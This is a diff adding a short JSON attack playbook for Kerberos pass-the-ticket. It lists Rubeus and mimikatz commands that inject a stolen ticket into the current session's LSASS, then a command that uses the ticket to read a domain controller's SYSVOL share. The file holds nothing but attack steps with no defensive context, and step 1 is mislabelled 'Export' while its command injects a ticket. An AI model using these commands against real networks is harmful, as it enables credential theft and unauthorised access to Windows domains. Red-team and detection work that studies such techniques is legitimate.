@@ -1,0 +1,25 @@
+{
+	"name": "Kerberos Ticket Reuse (PtT)",
+	"description": "Inject exported Kerberos tickets into current session.",
+	"tools": [],
+	"steps": [
+		{
+			"index": 1,
+			"name": "Export Current Ticket",
+			"command": "Rubeus.exe ptt /ticket:doIF... (base64)",
+			"description": "Prepare ticket for reuse."
+		},
+		{
+			"index": 2,
+			"name": "Inject Ticket",
+			"command": "mimikatz.exe \"kerberos::ptt ticket.kirbi\"",
+			"description": "Apply to LSASS."
+		},
+		{
+			"index": 3,
+			"name": "Access Resource",
+			"command": "dir \\\\dc01.corp.local\\SYSVOL",
+			"description": "Use ticket for file access."
+		}
+	]
+}
